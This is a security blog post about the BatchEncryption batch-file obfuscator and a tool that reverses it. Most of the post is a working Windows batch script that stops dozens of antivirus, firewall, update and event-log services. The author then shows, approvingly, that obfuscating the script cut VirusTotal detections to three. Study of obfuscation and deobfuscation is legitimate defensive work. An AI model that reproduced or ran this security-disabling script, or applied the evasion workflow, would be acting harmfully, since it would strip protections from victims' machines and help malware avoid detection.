+++
title = "Exploring the BatchEncryption tool (and its deobfuscator) by gwsbhqt@163.com "
date = 2024-03-11T20:03:02+02:00
draft = false
tags = ["BatchEncryption","UnJlaive","obfuscation"]
categories = ["malware"]
ShowToc = false
author = ["connar"]
+++

## What is the BatchEncryption tool
The BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote ("'"). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.

The use of this tool was seen back in 2017 in the *Jawlan and Suriya.doc* (SHA-256: 761483906b45fad51f3c7ab66b1534dee137e93a52816aa270bc97249acb56d0) and has almost unknown at the time, with only 3 google search results. Now it has started to pop up more (mainly in .cn forums).

An example of a batch file obfuscated with BatchEncryption can be seen below:  
![example](/posts/BatchEncryption/example.png)


The nice thing about this tool is that still in this day, it manages to get low AV detection in VT. Let's take a .bat sample that disables multiple different AV engines:
```bat
set ii=ne
set ywe=st
set ury=t
set iej=op
set jt53=Syma
set o6t=nor
set lyd2=fee
set h3d=ton
set gf45=ntec
set own5=McA
net stop "Security Center" /y
net stop "Automatic Updates" /y
net stop "Symantec Core LC" /y
net stop "SAVScan" /y
net stop "norton AntiVirus Firewall Monitor Service" /y
net stop "norton AntiVirus Auto-Protect Service" /y
net stop "norton AntiVirus Auto Protect Service" /y
net stop "McAfee Spamkiller Server" /y
net stop "McAfee Personal Firewall Service" /y
net stop "McAfee SecurityCenter Update Manager" /y
net stop "Symantec SPBBCSvc" /y
cls
net stop "Ahnlab Task Scheduler" /y
net stop navapsvc /y
net stop "Sygate Personal Firewall Pro" /y
net stop vrmonsvc /y
net stop MonSvcNT /y
net stop SAVScan /y
net stop NProtectService /y
net stop ccSetMGR /y
net stop ccEvtMGR /y
net stop srservice /y
net stop "Symantec Network Drivers Service" /y
net stop "norton Unerase Protection" /y
net stop MskService /y
net stop MpfService /y
net stop mcupdmgr.exe /y
net stop "McAfeeAntiSpyware" /y
net stop helpsvc /y
net stop ERSvc /y
net stop "*norton*" /y
net stop "*Symantec*" /y
net stop "*McAfee*" /y
cls
net stop ccPwdSvc /y
net stop "Symantec Core LC" /y
net stop navapsvc /y
net stop "Serv-U" /y
net stop "norton AntiVirus Auto Protect Service" /y
net stop "norton AntiVirus Client" /y
net stop "Symantec AntiVirus Client" /y
net stop "norton AntiVirus Server" /y
net stop "NAV Alert" /y
net stop "Nav Auto-Protect" /y
cls
net stop "McShield" /y
net stop "DefWatch" /y
net stop eventlog /y
net stop InoRPC /y
net stop InoRT /y
net stop InoTask /y
cls
net stop "norton AntiVirus Auto Protect Service" /y
net stop "norton AntiVirus Client" /y
net stop "norton AntiVirus Corporate Edition" /y
net stop "ViRobot Professional Monitoring" /y
net stop "PC-cillin Personal Firewall" /y
net stop "Trend Micro Proxy Service" /y
net stop "Trend NT Realtime Service" /y
net stop "McAfee.com McShield" /y
net stop "McAfee.com VirusScan Online Realtime Engine" /y
net stop "SyGateService" /y
net stop "Sygate Personal Firewall Pro" /y
cls
net stop "Sophos Anti-Virus" /y
net stop "Sophos Anti-Virus Network" /y
net stop "eTrust Antivirus Job Server" /y
net stop "eTrust Antivirus Realtime Server" /y
net stop "Sygate Personal Firewall Pro" /y
net stop "eTrust Antivirus RPC Server" /y
cls
net stop netsvcs
net stop spoolnt
```

The VT result of this is the following:  
![example](/posts/BatchEncryption/VT_plain.png)
(I got to admin I was expecting more).

Now let's use the BatchEncryption tool to obfuscate our sample and load it again:
![example](/posts/BatchEncryption/obfuscated_sample.png)

In just a text editor we can't really see what's going on because of the encoding used, but if we load it for example in cyberchef, it gets converted to utf8 and thus we can see readable chars. Anyways, we can see that indeed a lot of stuff is going on. Custom, existing envars, caret symbol for extra obfuscation etc. We also notice a header on top, which is the author of the program (gwsbhqt@163.com). Let's load it to VT and watch what happens:  
![example](/posts/BatchEncryption/VT_obfuscated.png)

We successfully reduced our results to only 3! For any of you wondering what would happen if we had removed the header of the author and load it again, it would give the same results. 

Let's now see how we can deobfuscate samples obfuscated with this technique.

## Batch-Encryption-DeCoder
Luckily for us, there is already a tool for this purpose, which can be found here:
- https://github.com/cnHopeStudio/Batch-Encryption-DeCoder

We need to build this tool to get the final executable, which when run, gives us the original batch file: 

![example](/posts/BatchEncryption/using_the_deobfuscator.png)


**References**
<blockquote>
    <ul>
        <li> [1] <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-bohannon-invoke_dosfuscation_techniques_for_fin_style_dos_level_cmd_obfuscation-wp.pdf">blackhat: <i>Exploring the Depths
of Cmd.exe Obfuscation and Detection Techniques</i></a></li>
        <li> [2] <a href="https://blog.csdn.net/Hunter98234/article/details/108672926">Amit: <i>Recipient batch processing documents confused by BatchEncryption (version 201610)</i></a></li>
        <li> [3] <a href="http://www.bathome.net/thread-42106-1-2.html">gwsbhqt: <i>[Original Tool][201610]BatchEncryption-BatchEncrying Encryption</i></a></li>
    </ul>
</blockquote>